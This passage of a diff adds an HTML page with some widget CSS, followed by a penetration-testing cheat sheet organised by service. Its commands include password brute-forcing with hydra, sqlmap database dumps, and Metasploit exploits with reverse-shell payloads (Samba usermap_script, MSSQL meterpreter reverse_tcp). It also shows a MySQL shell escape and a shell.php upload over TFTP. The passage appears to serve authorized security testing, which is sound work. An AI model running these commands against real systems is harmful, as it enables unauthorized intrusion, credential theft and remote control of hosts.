+  .swal2-icon.swal2-info {
+    border-color: #9de0f6;
+    color: #3fc3ee; }
+  .swal2-icon.swal2-question {
+    border-color: #c9dae1;
+    color: #87adbd; }
+  .swal2-icon.swal2-success {
+    border-color: #a5dc86; }
+    .swal2-icon.swal2-success [class^='swal2-success-circular-line'] {
+      position: absolute;
+      width: 3.75em;
+      height: 7.5em;
+      -webkit-transform: rotate(45deg);
+              transform: rotate(45deg);
+      border-radius: 50%; }
+      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='left'] {
+        top: -.4375em;
+        left: -2.0635em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg);
+        -webkit-transform-origin: 3.75em 3.75em;
+                transform-origin: 3.75em 3.75em;
+        border-radius: 7.5em 0 0 7.5em; }
+      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='right'] {
+        top: -.6875em;
+        left: 1.875em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg);
+        -webkit-transform-origin: 0 3.75em;
+                transform-origin: 0 3.75em;
+        border-radius: 0 7.5em 7.5em 0; }
+    .swal2-icon.swal2-success .swal2-success-ring {
+      position: absolute;
+      top: -.25em;
+      left: -.25em;
+      width: 100%;
+      height: 100%;
+      border: 0.25em solid rgba(165, 220, 134, 0.3);
+      border-radius: 50%;
+      z-index: 2;
+      box-sizing: content-box; }
+    .swal2-icon.swal2-success .swal2-success-fix {
+      position: absolute;
+      top: .5em;
+      left: 1.625em;
+      width: .4375em;
+      height: 5.625em;
+      -webkit-transform: rotate(-45deg);
+              transform: rotate(-45deg);
+      z-index: 1; }
+    .swal2-icon.swal2-success [class^='swal2-success-line'] {
+      display: block;
+      position: absolute;
+      height: .3125em;
+      border-radius: .125em;
+      background-color: #a5dc86;
+      z-index: 2; }
+      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='tip'] {
+        top: 2.875em;
+        left: .875em;
+        width: 1.5625em;
+        -webkit-transform: rotate(45deg);
+                transform: rotate(45deg); }
+      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='long'] {
+        top: 2.375em;
+        right: .5em;
+        width: 2.9375em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg); }
+
+.swal2-progresssteps {
+  align-items: center;
+  margin: 0 0 1.25em;
+  padding: 0;
+  font-weight: 600; }
+  .swal2-progresssteps li {
+    display: inline-block;
+    position: relative; }
+  .swal2-progresssteps .swal2-progresscircle {
+    width: 2em;
+    height: 2em;
+    border-radius: 2em;
+    background: #3085d6;
+    color: #fff;
+    line-height: 2em;
+    text-align: center;
+    z-index: 20; }
+    .swal2-progresssteps .swal2-progresscircle:first-child {
+      margin-left: 0; }
+    .swal2-progresssteps .swal2-progresscircle:last-child {
+      margin-right: 0; }
+    .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep {
+      background: #3085d6; }
+      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progresscircle {
+        background: #add8e6; }
+      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progressline {
+        background: #add8e6; }
+  .swal2-progresssteps .swal2-progressline {
+    width: 2.5em;
+    height: .4em;
+    margin: 0 -1px;
+    background: #3085d6;
+    z-index: 10; }
+
+[class^='swal2'] {
+  -webkit-tap-highlight-color: transparent; }
+
+.swal2-show {
+  -webkit-animation: swal2-show 0.3s;
+          animation: swal2-show 0.3s; }
+  .swal2-show.swal2-noanimation {
+    -webkit-animation: none;
+            animation: none; }
+
+.swal2-hide {
+  -webkit-animation: swal2-hide 0.15s forwards;
+          animation: swal2-hide 0.15s forwards; }
+  .swal2-hide.swal2-noanimation {
+    -webkit-animation: none;
+            animation: none; }
+
+[dir='rtl'] .swal2-close {
+  right: auto;
+  left: 0; }
+
+.swal2-animate-success-icon .swal2-success-line-tip {
+  -webkit-animation: swal2-animate-success-line-tip 0.75s;
+          animation: swal2-animate-success-line-tip 0.75s; }
+
+.swal2-animate-success-icon .swal2-success-line-long {
+  -webkit-animation: swal2-animate-success-line-long 0.75s;
+          animation: swal2-animate-success-line-long 0.75s; }
+
+.swal2-animate-success-icon .swal2-success-circular-line-right {
+  -webkit-animation: swal2-rotate-success-circular-line 4.25s ease-in;
+          animation: swal2-rotate-success-circular-line 4.25s ease-in; }
+
+.swal2-animate-error-icon {
+  -webkit-animation: swal2-animate-error-icon 0.5s;
+          animation: swal2-animate-error-icon 0.5s; }
+  .swal2-animate-error-icon .swal2-x-mark {
+    -webkit-animation: swal2-animate-error-x-mark 0.5s;
+            animation: swal2-animate-error-x-mark 0.5s; }
+
+@-webkit-keyframes swal2-rotate-loading {
+  0% {
+    -webkit-transform: rotate(0deg);
+            transform: rotate(0deg); }
+  100% {
+    -webkit-transform: rotate(360deg);
+            transform: rotate(360deg); } }
+
+@keyframes swal2-rotate-loading {
+  0% {
+    -webkit-transform: rotate(0deg);
+            transform: rotate(0deg); }
+  100% {
+    -webkit-transform: rotate(360deg);
+            transform: rotate(360deg); } }</style></head>
+    <body>
+        <fieldset class="box">
+            <legend>Pre-engagement</legend>
+                <ul>
+                    <li><span>Log all commands of the current session</span></li>
+                <pre><code>script&nbsp;engagement_x.log
+...
+exit&nbsp;#&nbsp;when&nbsp;finished</code></pre>
+                    <li><span>Use keepnote or other to document findings</span></li>
+                    <li><span>Create a screenshot of the selected area and save it at home directory</span></li>
+                <pre><code>$&nbsp;<span class="red">alias</span>&nbsp;ss=<span class="green">'import ~/ss-$(date +%F_%H%M_%S).png'</span></code></pre>
+                    <li><span>Set the Target IP Address to the $ip system variable </span></li>
+                <pre><code>$&nbsp;<span class="red">export</span>&nbsp;ip=target_ip</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>General methodology</legend>
+                <ul>
+                    <li><span>For every open port TCP/UDP</span></li>
+                        <ul>
+                            <li><span>Find service and version</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Find known service bugs</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Find configuration issues</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Run nmap port scan / banner grabbing</span></li>
+                        </ul>
+                    <li><span>Google</span></li>
+                        <ul>
+                            <li><span>Every error message</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Every URL path</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Every parameter to find versions/apps/bugs</span></li>
+                        </ul>
+                    <li><span>Run metasploit enum</span></li>
+                    <li><span>Run nmap vuln scan</span></li>
+                    <li><span>Run all steps of each service below</span></li>
+                    <li><span>searchsploit every service</span></li>
+                    <li><span>Google</span></li>
+                        <ul>
+                            <li><span>Every version exploit db</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Every version vulnerability</span></li>
+                        </ul>
+                    <li><span>Run metasploit exploits</span></li>
+                    <li><span>If app has auth:</span></li>
+                        <ul>
+                            <li><span>User enumeration</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Password bruteforce</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Default credentals google search</span></li>
+                        </ul>
+                    <li><span>If everything fails try:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;--script&nbsp;exploit&nbsp;-Pn&nbsp;$ip</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>DNS</legend>
+                <ul>
+                    <li><span>Find name servers</span></li>
+                <pre><code>$&nbsp;host&nbsp;-t&nbsp;ns&nbsp;guif.re</code></pre>
+                    <li><span>Find email servers</span></li>
+                <pre><code>$&nbsp;host&nbsp;-t&nbsp;mx&nbsp;guif.re</code></pre>
+                    <li><span>Subdomain bruteforcing</span></li>
+                <pre><code>$&nbsp;<span class="red">for</span>&nbsp;ip&nbsp;<span class="blue">in</span>&nbsp;<span class="green">$</span>(<span class="red">cat</span>&nbsp;list.txt);&nbsp;<span class="blue">do</span>&nbsp;host&nbsp;$ip.guif.re;&nbsp;done</code></pre>
+                    <li><span>Reverse dns lookup bruteforcing</span></li>
+                <pre><code>$&nbsp;<span class="red">for</span>&nbsp;ip&nbsp;<span class="blue">in</span>&nbsp;<span class="green">$</span>(seq&nbsp;155&nbsp;190);do&nbsp;host&nbsp;50.7.67.$ip;done&nbsp;|grep&nbsp;-v&nbsp;<span class="green">"not found"</span></code></pre>
+                    <li><span>Zone transfer request</span></li>
+                <pre><code>$&nbsp;host&nbsp;-l&nbsp;guif.re&nbsp;ns1.guif.re</code></pre>
+                <pre><code>$&nbsp;dnsrecon&nbsp;-d&nbsp;guif.re&nbsp;-t&nbsp;axfr</code></pre>
+                    <li><span>Finds nameservers for a given domain</span></li>
+                <pre><code>$&nbsp;host&nbsp;-t&nbsp;ns&nbsp;guif.re&nbsp;|&nbsp;cut&nbsp;-d&nbsp;<span class="green">" "</span>&nbsp;-f&nbsp;4&nbsp;#</code></pre>
+                <pre><code>$&nbsp;dnsenum&nbsp;guif.re</code></pre>
+                    <li><span>Nmap zone transfer scan</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;guif.re&nbsp;--script=dns-zone-transfer&nbsp;-p&nbsp;53</code></pre>
+                    <li><span>Finds the domain names for a host.</span></li>
+                <pre><code>$&nbsp;whois&nbsp;guif.re</code></pre>
+                    <li><span>Find the IP and authoritative servers.</span></li>
+                <pre><code>$&nbsp;<span class="red">nslookup</span>&nbsp;guif.re</code></pre>
+                    <li><span>Finds missconfigure DNS entries.</span></li>
+                <pre><code>$&nbsp;host&nbsp;-t&nbsp;ns&nbsp;guif.re</code></pre>
+                    <li><span>TheHarvester finds subdomains in google, bing, etc</span></li>
+                <pre><code>$&nbsp;python&nbsp;theHarvester.py&nbsp;&nbsp;-l&nbsp;500&nbsp;-b&nbsp;all&nbsp;-d&nbsp;guif.re</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Port scanning</legend>
+                <ul>
+                    <li><span>Automated:</span></li>
+                <pre><code>#!/bin/bash
+nmap&nbsp;$1&nbsp;-F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;first,&nbsp;quick&nbsp;scan
+nmap&nbsp;-sV&nbsp;-A&nbsp;-O&nbsp;-T4&nbsp;-sC&nbsp;$1&nbsp;&nbsp;&nbsp;#&nbsp;verify&nbsp;services,&nbsp;Os,&nbsp;run&nbsp;scripts
+nmap&nbsp;-p&nbsp;1-65535&nbsp;-T5&nbsp;-sT&nbsp;$1&nbsp;&nbsp;#&nbsp;scan&nbsp;all&nbsp;ports&nbsp;TCP
+nmap&nbsp;-p&nbsp;1-10000&nbsp;-T4&nbsp;-Su&nbsp;$1&nbsp;&nbsp;#&nbsp;UDP&nbsp;scan</code></pre>
+                    <li><span>Scan all 65536 ports TCP/UDP, nmap does only 1000 first ports by default</span></li>
+                    <li><span>Find hosts alive</span></li>
+                <pre><code>nmap&nbsp;-sP&nbsp;<span class="blue">192.168.0.1/24</span></code></pre>
+                    <li><span>Open ports scan (slow)</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-p&nbsp;1-65535&nbsp;-T4&nbsp;-sS&nbsp;$ip</code></pre>
+                    <li><span>Services finding enumeartion</span></li>
+                <pre><code>$&nbsp;<span class="red">sudo</span>&nbsp;nmap&nbsp;-sV&nbsp;-A&nbsp;-O&nbsp;-T4&nbsp;$ip</code></pre>
+                    <li><span>3way handshake scan</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-nvv&nbsp;-w&nbsp;1&nbsp;IP&nbsp;22-8</code></pre>
+                    <li><span>UDP scan</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-nvv&nbsp;-sU&nbsp;-w&nbsp;1&nbsp;$ip&nbsp;22-81</code></pre>
+                    <li><span>UDP scanning consists on sending an empty UDP packet. Open: reply back. Closed: ICMP unreachable packet is received</span></li>
+                    <li><span>ARP Scan</span></li>
+                <pre><code>$&nbsp;arp-scan&nbsp;<span class="blue">10.10.10.1/28</span>&nbsp;-I&nbsp;eth0</code></pre>
+                    <li><span>Nmap ping scan</span></li>
+                <pre><code>$&nbsp;<span class="red">sudo</span>&nbsp;nmap&nbsp;-sn&nbsp;-oA&nbsp;nmap_pingscan&nbsp;<span class="blue">10.10.10.1/24</span></code></pre>
+                    <li><span>Nmap SYN/Top 100 ports Scan</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-sS&nbsp;-F&nbsp;-oA&nbsp;nmap_fastscan&nbsp;<span class="blue">10.10.10.1/24</span></code></pre>
+                    <li><span>Services versions scan</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-sV&nbsp;$ip</code></pre>
+                    <li><span>Run the default scripts and normal port scan against all the found ports</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-sC&nbsp;$ip</code></pre>
+                    <li><span>Run all nmap scan scripts against found ports.</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-Pn&nbsp;-sV&nbsp;-O&nbsp;-pT:{TCP&nbsp;ports&nbsp;found},U:{UDP&nbsp;ports&nbsp;found}&nbsp;--script&nbsp;*vuln*&nbsp;$ip</code></pre>
+                    <li><span>Port scan with file report:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-Pn&nbsp;-sS&nbsp;--stats-every&nbsp;3m&nbsp;--max-retries&nbsp;1&nbsp;--max-scan-delay&nbsp;20&nbsp;--defeat-rst-ratelimit&nbsp;-T4&nbsp;-p1-65535&nbsp;-oA&nbsp;/root/192_168_15_201T&nbsp;<span class="blue">192.168.15.201</span></code></pre>
+                    <li><span>Full vulnerability scanning:</span></li>
+                <pre><code>$&nbsp;<span class="red">mkdir</span>&nbsp;/usr/share/nmap/scripts/vulnscan;&nbsp;<span class="red">cd</span>&nbsp;/usr/share/nmap/scripts/vulnscan;&nbsp;git&nbsp;clone&nbsp;<span class="blue">https://github.com/scipag/vulscan.git;</span>&nbsp;nmap&nbsp;-sS&nbsp;-sV&nbsp;--script=/usr/share/nmap/scripts/vulnscan/vulscan.nse&nbsp;$ip</code></pre>
+                    <li><span>Identify unknown services</span></li>
+                <pre><code>$&nbsp;amap&nbsp;-d&nbsp;$ip&nbsp;&lt;port&gt;</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>SMB</legend>
+                <ul>
+                    <li><span>Versions 1,2,3. TCP 139, 445 and many UDP ports.</span></li>
+                    <li><span>Enumeration</span></li>
+                <pre><code>$&nbsp;nmblookup&nbsp;-A&nbsp;$ip</code></pre>
+                <pre><code>$&nbsp;enum4linux&nbsp;-a&nbsp;$ip</code></pre>
+                    <li><span>Versions Samba 2.2.x are red flag</span></li>
+                    <li><span>A null SMB session can be used to gather passwords and useful information from SMB 1.</span></li>
+                    <li><span>Null session and extract information.</span></li>
+                <pre><code>$&nbsp;nbtscan&nbsp;-r&nbsp;$ip</code></pre>
+                    <li><span>Version</span></li>
+                <pre><code>msfconsole;&nbsp;use&nbsp;scanner/smb/smb_version;&nbsp;set&nbsp;RHOSTS&nbsp;$ip;&nbsp;run</code></pre>
+                    <li><span>MultiExploit</span></li>
+                <pre><code>msfconsole;&nbsp;use&nbsp;exploit/multi/samba/usermap_script;&nbsp;set&nbsp;lhost&nbsp;192.168.0.X;&nbsp;set&nbsp;rhost&nbsp;$ip;&nbsp;run</code></pre>
+                    <li><span>Quick enum:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;--script=smb-enum*&nbsp;--script-args=unsafe=1&nbsp;-T5&nbsp;$ip</code></pre>
+                    <li><span>Quick vuln scan:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;--script=smb-vuln*&nbsp;--script-args=unsafe=1&nbsp;-T5&nbsp;$ip</code></pre>
+                    <li><span>Full enum and vuln scanning:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;--script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery&nbsp;--script-args=unsafe=1&nbsp;-T5&nbsp;$ip</code></pre>
+                    <li><span>Full enum &amp; vuln scan:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-p139,445&nbsp;-T4&nbsp;-oN&nbsp;smb_vulns.txt&nbsp;-Pn&nbsp;--script&nbsp;<span class="green">'not brute and not dos and smb-*'</span>&nbsp;-vv&nbsp;-d&nbsp;$ip</code></pre>
+                    <li><span>Mount:</span></li>
+                <pre><code>$&nbsp;smbclient&nbsp;//$ip/share&nbsp;-U&nbsp;username</code></pre>
+                    <li><span>Anonymous mount:</span></li>
+                <pre><code>$&nbsp;smbclient&nbsp;//$ip/share&nbsp;#&nbsp;hit&nbsp;enter&nbsp;<span class="blue">with</span>&nbsp;blank&nbsp;password</code></pre>
+                    <li><span>Worth testing eternalblue</span></li>
+                    <li><span>Bruteforce</span></li>
+                <pre><code>$&nbsp;hydra&nbsp;-l&nbsp;administrator&nbsp;-P&nbsp;/usr/share/wordlists/rockyou.txt&nbsp;-t&nbsp;1&nbsp;$ip&nbsp;smb</code></pre>
+                    <li><span>Any metasploit exploit through Netbios over TCP in 139, you need to set:</span></li>
+                <pre><code>&gt;&nbsp;&nbsp;set&nbsp;SMBDirect&nbsp;<span class="blue">false</span></code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Netbios</legend>
+                <ul>
+                    <li><span>Dumping the netbios table:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-Pn&nbsp;-sUC&nbsp;-p137&nbsp;$ip</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>NFS</legend>
+                <ul>
+                    <li><span>Show all mounts</span></li>
+                <pre><code>$&nbsp;showmount&nbsp;-e&nbsp;$ip</code></pre>
+                    <li><span>Mount a NFS share</span></li>
+                <pre><code>$&nbsp;mount&nbsp;$ip:/vol/share&nbsp;/mnt/nfs</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Web</legend>
+                <ul>
+                <pre><code>$&nbsp;nikto&nbsp;-host&nbsp;$ip</code></pre>
+                <pre><code>$&nbsp;<span class="red">wget</span>&nbsp;<span class="blue">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web_Content/Top1000-RobotsDisallowed.txt;</span>&nbsp;gobuster&nbsp;-u&nbsp;http://$ip&nbsp;-w&nbsp;Top1000-RobotsDisallowed.txt</code></pre>
+                <pre><code>$&nbsp;wfuzz&nbsp;-c&nbsp;-z&nbsp;list.txt&nbsp;--sc&nbsp;200&nbsp;http://$ip</code></pre>
+                    <li><span>Directory discovery</span></li>
+                <pre><code>$&nbsp;dirb&nbsp;$ip&nbsp;/usr/share/wordlists/dirb/common.txt</code></pre>
+                <pre><code>$&nbsp;gobuster&nbsp;-w&nbsp;/usr/share/wordlists/dirb/common.txt&nbsp;-u&nbsp;$ip</code></pre>
+                <pre><code>$&nbsp;gobuster&nbsp;-u&nbsp;http://$ip/&nbsp;&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web_Content/common.txt&nbsp;-s&nbsp;<span class="green">'200,204,301,302,307,403,500'</span>&nbsp;-e</code></pre>
+                <pre><code>$&nbsp;gobuster&nbsp;-u&nbsp;http://$ip/&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web_Content/cgis.txt&nbsp;-s&nbsp;<span class="green">'200,204,403,500'</span>&nbsp;-e</code></pre>
+                <pre><code>$&nbsp;<span class="red">cd</span>&nbsp;/root/dirsearch;&nbsp;python3&nbsp;dirsearch.py&nbsp;&nbsp;-u&nbsp;http://$ip/&nbsp;-e&nbsp;.php</code></pre>
+                    <li><span>Banner grabbing</span></li>
+                <pre><code>./whatweb&nbsp;$ip&nbsp;#&nbsp;identifies&nbsp;all&nbsp;known&nbsp;services</code></pre>
+                    <li><span>Methods testing</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;--script&nbsp;http-methods&nbsp;--script-args&nbsp;http-methods.url-path=<span class="green">'/test'</span>&nbsp;$ip</code></pre>
+                    <li><span>Bruteforcing authentication</span></li>
+                <pre><code>$&nbsp;hydra&nbsp;<span class="blue">10.0.0.1</span>&nbsp;http-post-form&nbsp;<span class="green">"/admin.php:target=auth&amp;mode=login&amp;user=^USER^&amp;password=^PASS^:invalid"</span>&nbsp;-P&nbsp;/usr/share/wordlists/rockyou.txt&nbsp;-l&nbsp;admin</code></pre>
+                    <li><span>Vulnerability scanning:</span></li>
+                <pre><code>$&nbsp;nikto&nbsp;-host&nbsp;http://$ip</code></pre>
+                <pre><code>$&nbsp;nmap&nbsp;--script=http-vuln*&nbsp;$ip&nbsp;</code></pre>
+                    <li><span>Test against SQLI</span></li>
+                <pre><code>sqlmap&nbsp;-u&nbsp;<span class="green">"http://$ip/?query"</span>&nbsp;--data=<span class="green">"user=foo&amp;pass=bar&amp;submit=Login"</span>&nbsp;--level=5&nbsp;--risk=3&nbsp;--dbms=mysql&nbsp;&nbsp;</code></pre>
+                    <li><span>Coldfusion vulnerability scanning</span></li>
+                <pre><code>$&nbsp;&nbsp;nmap&nbsp;-v&nbsp;-p&nbsp;80&nbsp;--script=http-vuln-cve2010-2861&nbsp;$ip</code></pre>
+                    <li><span>Bruteforce basic auth</span></li>
+                <pre><code>$&nbsp;hydra&nbsp;-l&nbsp;user&nbsp;-P&nbsp;/usr/share/wordlists/rockyou.txt&nbsp;-f&nbsp;$ip&nbsp;http-get&nbsp;/path</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>WebDav</legend>
+                <ul>
+                    <li><span>test</span></li>
+                <pre><code>$&nbsp;davtest&nbsp;-move&nbsp;-sendbd&nbsp;<span class="blue">auto</span>&nbsp;-url&nbsp;http://$ip:8080/webdav/</code></pre>
+                <pre><code>$&nbsp;cadaver&nbsp;http://$ip:8080/webdav/</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Mysql</legend>
+                <ul>
+                <pre><code>$&nbsp;nmap&nbsp;-sV&nbsp;-Pn&nbsp;-vv&nbsp;--script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122&nbsp;$ip&nbsp;-p&nbsp;3306</code></pre>
+                    <li><span>Nmap scan</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-sV&nbsp;-Pn&nbsp;-vv&nbsp;-script=mysql*&nbsp;$ip&nbsp;-p&nbsp;3306</code></pre>
+                    <li><span>Vuln scanning:</span></li>
+                <pre><code>$&nbsp;sqlmap&nbsp;-u&nbsp;<span class="green">'http://$ip/login-off.asp'</span>&nbsp;--method&nbsp;POST&nbsp;&nbsp;--data&nbsp;<span class="green">'txtLoginID=admin&amp;txtPassword=aa&amp;cmdSubmit=Login'</span>&nbsp;--all&nbsp;--dump-all</code></pre>
+                    <li><span>If Mysql is running as root and you have acces, you can run commands:</span></li>
+                <pre><code>mysql&gt;&nbsp;<span class="red">select</span>&nbsp;<span class="green">do_system</span>(<span class="green">'id'</span>);
+mysql&gt;&nbsp;\!&nbsp;sh</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>MsSql</legend>
+                <ul>
+                    <li><span>Enumerate MSSQL Servers on the network</span></li>
+                <pre><code>msf&nbsp;&gt;&nbsp;use&nbsp;auxiliary/scanner/mssql/mssql_ping
+$&nbsp;nmap&nbsp;-sU&nbsp;--script=ms-sql-info&nbsp;$ip</code></pre>
+                    <li><span>Bruteforce MsSql</span></li>
+                <pre><code>msf&nbsp;<span class="green">auxiliary</span>(mssql_login)&nbsp;&gt;&nbsp;use&nbsp;auxiliary/scanner/mssql/mssql_login</code></pre>
+                    <li><span>Gain shell using gathered credentials</span></li>
+                <pre><code>msf&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/mssql/mssql_payload
+&nbsp;&nbsp;&nbsp;&nbsp;msf&nbsp;<span class="green">exploit</span>(mssql_payload)&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp</code></pre>
+                    <li><span>Log in to a MsSql server:</span></li>
+                <pre><code>#&nbsp;root@kali:~/dirsearch#&nbsp;<span class="red">cat</span>&nbsp;../.freetds.conf
+[someserver]
+host&nbsp;=&nbsp;$ip
+port&nbsp;=&nbsp;1433
+tds&nbsp;version&nbsp;=&nbsp;8.0
+user=sa
+
+root@kali:~/dirsearch#&nbsp;sqsh&nbsp;-S&nbsp;someserver&nbsp;-U&nbsp;sa&nbsp;-P&nbsp;<span class="blue">PASS</span>&nbsp;-D&nbsp;DB_NAME</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Redis</legend>
+                <ul>
+                    <li><span>Enumerate:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-p6379&nbsp;--script&nbsp;redis-info&nbsp;$ip</code></pre>
+                    <li><span>Client:</span></li>
+                <pre><code>$&nbsp;redis-cli&nbsp;-h&nbsp;$ip</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Memcached</legend>
+                <ul>
+                    <li><span>Enumerate:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-p11211&nbsp;--script&nbsp;memcached-info&nbsp;$ip</code></pre>
+                    <li><span>Extract data:</span></li>
+                <pre><code>msf&nbsp;&gt;&nbsp;use&nbsp;auxiliary/gather/memcached_extractor</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>SMTP</legend>
+                <ul>
+                    <li><span>Always do users enumeration</span></li>
+                <pre><code>smtp-user-enum&nbsp;-M&nbsp;VRFY&nbsp;-U&nbsp;/usr/share/wordlists/metasploit/unix_users.txt&nbsp;-t&nbsp;$ip</code></pre>
+                <pre><code>&gt;use&nbsp;auxiliary/scanner/smtp/smtp_enum</code></pre>
+                    <li><span>Command to check if a user exists</span></li>
+                <pre><code>&gt;VRFY&nbsp;root</code></pre>
+                    <li><span>Command to ask the server if a user belongs to a mailing list</span></li>
+                <pre><code>&gt;EXPN&nbsp;root</code></pre>
+                    <li><span>Enumeration and vuln scanning:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;--script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764&nbsp;-p&nbsp;25&nbsp;$ip</code></pre>
+                    <li><span>Bruteforce</span></li>
+                <pre><code>$&nbsp;hydra&nbsp;-P&nbsp;/usr/share/wordlistsnmap.lst&nbsp;$ip&nbsp;smtp&nbsp;-V</code></pre>
+                    <li><span>Metasploit user enumeration</span></li>
+                <pre><code>use&nbsp;auxiliary/scanner/smtp/smtp_enum</code></pre>
+                    <li><span>Testing for open relay</span></li>
+                <pre><code>telnet&nbsp;$ip&nbsp;25
+EHLO&nbsp;root
+MAIL&nbsp;FROM:root@target.com
+RCPT&nbsp;TO:example@gmail.com
+DATA
+Subject:&nbsp;Testing&nbsp;open&nbsp;mail&nbsp;relay.
+Testing&nbsp;SMTP&nbsp;open&nbsp;mail&nbsp;relay.&nbsp;Have&nbsp;a&nbsp;nice&nbsp;day.
+.
+QUIT</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>RPC (135)</legend>
+                <ul>
+                    <li><span>Enumerate, shows if any NFS mount exposed:</span></li>
+                <pre><code>$&nbsp;rpcinfo&nbsp;-p&nbsp;$ip</code></pre>
+                <pre><code>$&nbsp;nmap&nbsp;$ip&nbsp;--script=msrpc-enum</code></pre>
+                <pre><code>msf&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/dcerpc/ms03_026_dcom</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>FTP enumeration</legend>
+                <ul>
+                    <li><span>Enumerate:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;--script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum&nbsp;-p&nbsp;21&nbsp;$ip</code></pre>
+                    <li><span>Bruteforce</span></li>
+                <pre><code>$&nbsp;hydra&nbsp;-l&nbsp;user&nbsp;-P&nbsp;/usr/share/john/password.lst&nbsp;ftp://$ip:21</code></pre>
+                    <li><span>Bruteforce with metasploit</span></li>
+                <pre><code>$&nbsp;msfconsole&nbsp;-q msf&gt;&nbsp;search&nbsp;type:auxiliary&nbsp;login msf&gt;&nbsp;use&nbsp;auxiliary/scanner/ftp/ftp_login</code></pre>
+                    <li><span>Vuln scan</span></li>
+                <pre><code>$&nbsp;&nbsp;nmap&nbsp;--script=ftp-*&nbsp;-p&nbsp;21&nbsp;$ip</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>TFTP</legend>
+                <ul>
+                    <li><span>If unathenticated access is allowed with write permissions you can upload a shell:</span></li>
+                <pre><code>$&nbsp;tftp&nbsp;$ip
+tftp&gt;&nbsp;ls
+?Invalid&nbsp;command
+tftp&gt;&nbsp;verbose
+Verbose&nbsp;mode&nbsp;on.
+tftp&gt;&nbsp;put&nbsp;shell.php
+Sent&nbsp;3605&nbsp;bytes&nbsp;<span class="blue">in</span>&nbsp;0.0&nbsp;seconds&nbsp;[inf&nbsp;bits/sec]</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
